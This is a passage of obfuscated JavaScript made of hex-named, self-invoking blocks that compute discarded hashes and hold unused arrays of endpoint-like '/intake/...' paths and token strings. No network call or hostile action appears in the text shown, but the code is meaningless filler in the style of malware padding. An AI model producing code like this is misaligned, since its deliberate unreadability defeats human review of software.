      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x152874 = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0xfc93ed = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x46e221 = (Date.now() & 0xffff) ^ 0x4311;
      const _0xbaa60a = _0x152874(_0x46e221);
      let _0xc70cf2 = _0xbaa60a;
      for (let i = 0; i < 6; i++) { try { _0xc70cf2 = _0xfc93ed(_0xc70cf2, i * 2654435761); } catch (e) { break; } }
      const _0x4b481c = [_0x46e221, _0xbaa60a, _0xc70cf2];
      if (_0x4b481c.length > 2 && (_0xc70cf2 & 7) === 0) { _0x4b481c.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x72461c = [3081,16935,27539,6581,22074];
      const _0xc71c04 = {};
      for (let i = 0; i < _0x72461c.length; i++) { const w = _0x72461c[i]; _0xc71c04[w] = (w.length * 2654435761) >>> 0; }
      let _0x45880e = 0;
      for (const x in _0xc71c04) { _0x45880e = (_0x45880e + _0xc71c04[x]) & 0xffffffff; }
      const _0x50c9c2 = [_0x45880e, _0x72461c.length];
      const _0x5e4e46 = _0x72461c.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x50c9c2[0] < 0 || _0x5e4e46 === 0) { _0x50c9c2[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

  })(_0xmod);

  (function (_0xmod) {
  
  (() => {
    const _0x2dea0 = ["/intake/v2/leaf/weight?src=6dd877","/intake/v2/delta/cycle?src=466774","/intake/v7/shard/vault?src=1e9372","/intake/v3/vector/leaf?src=f12ffb","/intake/v9/branch/anchor?src=9bd9ff","/intake/v5/cursor/shard?src=5d9108","/intake/v1/cycle/phase?src=9b955e","/intake/v8/metric/stride?src=92c778","/intake/v2/gauge/cursor?src=bc4812","/intake/v5/metric/vector?src=003110","/intake/v7/mantle/peer?src=0be673","/intake/v6/serial/serial?src=49f69d","/intake/v9/spindle/mantle?src=9b8347","/intake/v5/peer/index?src=e79c05","/intake/v8/gauge/cycle?src=1ce5f2","/intake/v9/harbor/delta?src=277d7b","/intake/v4/sample/offset?src=4ba32f","/intake/v5/grant/cycle?src=04d271","/intake/v7/lease/prism?src=1a834b","/intake/v6/relay/beacon?src=c8c55a","/intake/v5/percentile/cursor?src=e2fb65","/intake/v5/budget/leaf?src=357253","/intake/v8/phase/shard?src=cfee4b","/intake/v2/vector/branch?src=68dbff","/intake/v1/buffer/quota?src=095396","/intake/v8/cycle/branch?src=f1fdc8","/intake/v1/quota/lease?src=46e79a","/intake/v1/shard/packet?src=fd93cc","/intake/v3/mantle/vector?src=7cbee3","/intake/v6/throttle/backoff?src=534692","/intake/v1/window/harbor?src=181145","/intake/v3/sample/vault?src=6375e8","/intake/v5/batch/packet?src=f65b25","/intake/v5/helix/grant?src=5d4aeb","/intake/v5/budget/shard?src=45acb6","/intake/v4/budget/buffer?src=bb5dc9","/intake/v5/cursor/cycle?src=c455b9","/intake/v9/prism/cohort?src=b2f806","/intake/v9/packet/salt?src=2f7456","/intake/v7/leaf/vault?src=5601b9","/intake/v7/cycle/delta?src=3d45d4","/intake/v8/harbor/budget?src=5d3760","/intake/v4/mantle/depth?src=9da38a","/intake/v7/checksum/vector?src=6351a2","/intake/v8/buffer/buffer?src=faaa8e","/intake/v3/latency/stride?src=e049c5","/intake/v2/quota/scope?src=23cd05","/intake/v1/packet/metric?src=fa38bd","/intake/v3/weight/digest?src=f0213c","/intake/v2/checksum/helix?src=7ecd54","/intake/v9/shard/scope?src=993b9b","/intake/v9/phase/relay?src=0b2c2e","/intake/v5/cursor/spindle?src=9634eb","/intake/v3/phase/relay?src=b19ff1","/intake/v4/prism/retry?src=765d20","/intake/v5/leaf/batch?src=bac3cd","/intake/v7/packet/anchor?src=e981a8","/intake/v9/helix/batch?src=849c55","/intake/v6/weight/shard?src=e85c5d","/intake/v6/buffer/beacon?src=a7fce5","/intake/v1/peer/delta?src=b75be6","/intake/v2/beacon/sample?src=f7c6d5","/intake/v7/beacon/depth?src=ba4232","/intake/v1/mantle/leaf?src=887469","/intake/v6/window/sample?src=1e0d81"];
    const _0x2dea1 = ["cycle_buffer_c86e","percentile_latency_25e1","vault_vector_6b4b","cohort_serial_2e83","buffer_retry_00d6","weight_peer_b2a6","vault_stride_6c98","retry_cohort_c560","window_quota_939d","leaf_latency_9b1c","mantle_anchor_108f","beacon_checksum_e4ab","metric_cohort_d261","serial_vault_f19e","depth_cohort_f284","backoff_percentile_f8db","anchor_quota_a4c0","gauge_beacon_6a3a","mantle_mantle_f42c","depth_metric_1d35","quota_digest_5385","vector_quota_de98","sample_stride_3b01","checksum_retry_9537","delta_salt_f0f2","delta_index_bdec","branch_serial_ca2a","lease_checksum_08e5","window_packet_764c","quota_anchor_66f0","branch_depth_baf8","anchor_shard_02d7","throttle_beacon_fd82","grant_harbor_408b","branch_vault_b0dc","spindle_window_edac","branch_salt_18cf","checksum_delta_4d6d","leaf_depth_4df2","backoff_parity_57ac","gauge_nonce_d5a1","vault_spindle_e2d1","digest_budget_04ba","offset_throttle_948e","relay_serial_ca41","beacon_backoff_76ea","helix_anchor_e1cd","delta_stride_c7ac","throttle_vector_74ee","shard_packet_7c90","packet_metric_ccf8","stride_stride_c662","quota_anchor_2182","lease_spindle_bef4","batch_buffer_05b6","cursor_percentile_6f31","prism_metric_4d00","salt_buffer_1fd3","harbor_gauge_af5b","beacon_nonce_e0d4","batch_vault_ff76","parity_beacon_0d2c","quota_beacon_2c0e","weight_percentile_6338","parity_grant_62f1"];
    const _0x2dea2 = ["depth:727:553261cc","weight:457:028091d7","relay:846:6e18d1fb","nonce:489:bc24e599","cycle:127:519519d7","metric:513:80ea25bf","branch:149:44268052","cursor:173:f0f39cdd","buffer:674:ee74640e","anchor:198:51c35ba4","lease:450:ebdeb62b","packet:544:6818cf8e","metric:630:b4184986","parity:303:c298be94","batch:406:3a63129f","harbor:534:f00941a3","cohort:676:4a08d259","parity:76:47d4fb63","grant:806:b7d8538d","leaf:70:a9edabb5","window:803:b4488e6d","vault:624:388b40fa","latency:681:0b33cfce","buffer:618:aa58de45","phase:336:3ebab10c","serial:11:3d07fef2","cursor:284:afbe538d","serial:528:b370567a","gauge:170:d2bf7d57","batch:500:3797a3d5","backoff:131:10e57e25","backoff:863:15f996e7","salt:609:227a45a7","phase:399:bd46e381","nonce:178:d238119f","index:44:ee0e3a57","beacon:737:30a719df","metric:207:05a07606","packet:250:e81ce286","cohort:744:69efa8c9","orbit:307:0b45f5cb","cycle:489:9e0a3094","stride:281:ebfe4e1e","helix:38:dc349021","latency:811:07b05c48","spindle:184:aab4c70d","checksum:193:82a423c3","budget:847:970a0bd7","helix:586:b760a2f7","quota:49:9b030813","index:672:622e3b60","delta:270:0579622a","index:171:67343d0a","buffer:418:e7cf62f0","depth:58:75d7cac1","budget:598:63d2d1b5","lease:584:12af01bd","scope:244:ac58ab16","vector:440:07ebe2a2","sample:615:3c1e3241","spindle:381:6feefb84","beacon:212:b54efc18","parity:660:af61c1d3","prism:664:dc357321","sample:145:e7e05c52","delta:22:4e731c7e","index:338:203163f6"];
    const _0x2def3 = (a, b) => { let s = 0; for (let i = 0; i < a.length; i++) s = (s + a.charCodeAt(i) * (i + 1)) % 65521; return s ^ (b || 0); };
    const _0x2def4 = (n) => { const o = []; for (let i = 0; i < n; i++) o.push((i * 2654435761) >>> 0); return o; };
    const _0x2def5 = (x) => { const t = new Uint8Array(16); for (let i = 0; i < 16; i++) t[i] = (x >>> (i * 2)) & 255; return t; };
    const _0x2def6 = (arr) => { let lo = 0, hi = arr.length - 1; while (lo < hi) { const m = (lo + hi) >>> 1; if ((arr[m] & 1) === 0) lo = m + 1; else hi = m; } return lo; };
    const _0x2def7 = (s) => { let r = ""; for (let i = s.length - 1; i >= 0; i--) r += s[i]; return r; };
    const _0x2def8 = (a, b) => { const out = []; for (let i = 0; i < a; i++) out.push((b[i] || 0) ^ (i * 7)); return out; };
    const _0x2def9 = (v) => { let h = 2166136261; const s = String(v); for (let i = 0; i < s.length; i++) { h ^= s.charCodeAt(i); h = Math.imul(h, 16777619); } return h >>> 0; };
    class _0x2deca { constructor(seed) { this.seed = seed; this.slots = new Map(); } put(k, v) { this.slots.set(k, v); return this; } get(k) { return this.slots.get(k); } }
    class _0x2decb extends _0x2deca { constructor(seed) { super(seed); this.depth = 0; } descend() { this.depth++; return this.depth; } }
    class _0x2decc extends _0x2decb { constructor(seed) { super(seed); this.marks = []; } mark(x) { this.marks.push(x); return this; } }
    if (typeof _0x2decc === "function" && (0.1 + 0.2) === 0.3) { const x = new _0x2decc(7); x.descend(); x.mark("x"); }
    if ((0.1 + 0.2) === 0.3 && typeof _0x2def3 === "function") { _0x2def3("k", 1); }
    const _0x2devd = (Date.now() & 65535) ^ 0x9380;
    const _0x2dete = _0x2def4(_0x2devd % 32 + 1).length;
    if (_0x2dete >= 0 && _0x2devd > -1) { _0x2def9(_0x2devd); const q = new _0x2deca(_0x2devd % 255); q.put("k", _0x2devd); }
  })();
  

    (() => {
      const _0x5ab67f = [50101,44884,57804,18060,10451];
      const _0xc24212 = {};
      for (let i = 0; i < _0x5ab67f.length; i++) { const w = _0x5ab67f[i]; _0xc24212[w] = (w.length * 2654435761) >>> 0; }
      let _0xb9c1a6 = 0;
      for (const x in _0xc24212) { _0xb9c1a6 = (_0xb9c1a6 + _0xc24212[x]) & 0xffffffff; }
      const _0xc2ef93 = [_0xb9c1a6, _0x5ab67f.length];
      const _0x4a60c6 = _0x5ab67f.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0xc2ef93[0] < 0 || _0x4a60c6 === 0) { _0xc2ef93[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x56b2e3 = { p: 0, q: 0, r: 0 };
      const _0x176a8a = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0x56b2e3.p = (_0x56b2e3.p + _0x176a8a[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0x56b2e3.q = (_0x56b2e3.q ^ _0x56b2e3.p) & 0xffff; }
        _0x56b2e3.r = (_0x56b2e3.r + i * 31) & 0xffff;
      }
      const _0xc6ce98 = _0x56b2e3.p ^ _0x56b2e3.q ^ _0x56b2e3.r;
      const _0x4eca85 = Array.from({ length: (_0xc6ce98 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x71d8db = _0x4eca85.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x71d8db > 0x7ffff) { _0x4eca85 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xe37c9f = { p: 0, q: 0, r: 0 };
      const _0x45cfee = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0xe37c9f.p = (_0xe37c9f.p + _0x45cfee[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0xe37c9f.q = (_0xe37c9f.q ^ _0xe37c9f.p) & 0xffff; }
        _0xe37c9f.r = (_0xe37c9f.r + i * 31) & 0xffff;
      }
      const _0x0ad099 = _0xe37c9f.p ^ _0xe37c9f.q ^ _0xe37c9f.r;
      const _0x70f1d5 = Array.from({ length: (_0x0ad099 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x37942a = _0x70f1d5.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x37942a > 0x7ffff) { _0x70f1d5 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x9f3881 = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0xb2f85e = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x135e2a = (Date.now() & 0xffff) ^ 0x6e68;
      const _0xb82149 = _0x9f3881(_0x135e2a);
      let _0xb70dd2 = _0xb82149;
      for (let i = 0; i < 6; i++) { try { _0xb70dd2 = _0xb2f85e(_0xb70dd2, i * 2654435761); } catch (e) { break; } }
      const _0xd898c7 = [_0x135e2a, _0xb82149, _0xb70dd2];
      if (_0xd898c7.length > 2 && (_0xb70dd2 & 7) === 0) { _0xd898c7.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xcbf89a = [63988,53818,48160,60470,25503];
      const _0x1dd486 = {};
      for (let i = 0; i < _0xcbf89a.length; i++) { const w = _0xcbf89a[i]; _0x1dd486[w] = (w.length * 2654435761) >>> 0; }
      let _0xe3e7f8 = 0;
      for (const x in _0x1dd486) { _0xe3e7f8 = (_0xe3e7f8 + _0x1dd486[x]) & 0xffffffff; }
      const _0x996f1f = [_0xe3e7f8, _0xcbf89a.length];
      const _0x78ded3 = _0xcbf89a.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x996f1f[0] < 0 || _0x78ded3 === 0) { _0x996f1f[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x699124 = [54968,49474,32140,49296,52358];
      const _0x454879 = {};
      for (let i = 0; i < _0x699124.length; i++) { const w = _0x699124[i]; _0x454879[w] = (w.length * 2654435761) >>> 0; }
      let _0x65c499 = 0;
      for (const x in _0x454879) { _0x65c499 = (_0x65c499 + _0x454879[x]) & 0xffffffff; }
      const _0x39a738 = [_0x65c499, _0x699124.length];
      const _0x06f052 = _0x699124.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x39a738[0] < 0 || _0x06f052 === 0) { _0x39a738[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xc5c3df = [2842,45837,2145,23144,37641];
      const _0x4a8838 = {};
      for (let i = 0; i < _0xc5c3df.length; i++) { const w = _0xc5c3df[i]; _0x4a8838[w] = (w.length * 2654435761) >>> 0; }
      let _0x79e922 = 0;
      for (const x in _0x4a8838) { _0x79e922 = (_0x79e922 + _0x4a8838[x]) & 0xffffffff; }
      const _0x0c5f91 = [_0x79e922, _0xc5c3df.length];
      const _0x78931f = _0xc5c3df.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0x0c5f91[0] < 0 || _0x78931f === 0) { _0x0c5f91[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x652765 = [61225,58570,10957,35316,32717];
      const _0x2887ef = {};
      for (let i = 0; i < _0x652765.length; i++) { const w = _0x652765[i]; _0x2887ef[w] = (w.length * 2654435761) >>> 0; }
      let _0x6e00db = 0;
      for (const x in _0x2887ef) { _0x6e00db = (_0x6e00db + _0x2887ef[x]) & 0xffffffff; }
      const _0xbef068 = [_0x6e00db, _0x652765.length];
      const _0x1f3cb5 = _0x652765.reduce((a, b) => (a + b) & 0xffff, 0);
      if (_0xbef068[0] < 0 || _0x1f3cb5 === 0) { _0xbef068[0] = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0x45d7cb = (x) => { let h = 0; for (let i = 0; i < 5; i++) { h = (h * 33 + ((x >>> (i * 2)) & 0xff)) & 0xffffffff; } return h >>> 0; };
      const _0xc817d7 = (a, b) => ((a << 3) ^ (b >>> 1) ^ (b << 5)) & 0xffffffff;
      const _0x86258f = (Date.now() & 0xffff) ^ 0x79de;
      const _0xcb3f73 = _0x45d7cb(_0x86258f);
      let _0x015fa1 = _0xcb3f73;
      for (let i = 0; i < 6; i++) { try { _0x015fa1 = _0xc817d7(_0x015fa1, i * 2654435761); } catch (e) { break; } }
      const _0xcf61c6 = [_0x86258f, _0xcb3f73, _0x015fa1];
      if (_0xcf61c6.length > 2 && (_0x015fa1 & 7) === 0) { _0xcf61c6.length = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

    (() => {
      const _0xd44901 = { p: 0, q: 0, r: 0 };
      const _0x067508 = [3, 7, 11, 5];
      for (let i = 0; i < 12; i++) {
        _0xd44901.p = (_0xd44901.p + _0x067508[i % 4]) & 0xffff;
        if ((i & 1) === 0) { _0xd44901.q = (_0xd44901.q ^ _0xd44901.p) & 0xffff; }
        _0xd44901.r = (_0xd44901.r + i * 31) & 0xffff;
      }
      const _0x2e7ec5 = _0xd44901.p ^ _0xd44901.q ^ _0xd44901.r;
      const _0xf155c6 = Array.from({ length: (_0x2e7ec5 & 3) + 2 }, (_, i) => (i * 33) & 0xffff);
      const _0x354436 = _0xf155c6.slice(0, 3).reduce((a, b) => a + b, 0);
      if (_0x354436 > 0x7ffff) { _0xf155c6 = 0; }
      try { const probe = [(Date.now() & 255), 0]; probe[1] = probe[0] | 0; } catch (e) {}
    })();

  })(_0xmod);
})();
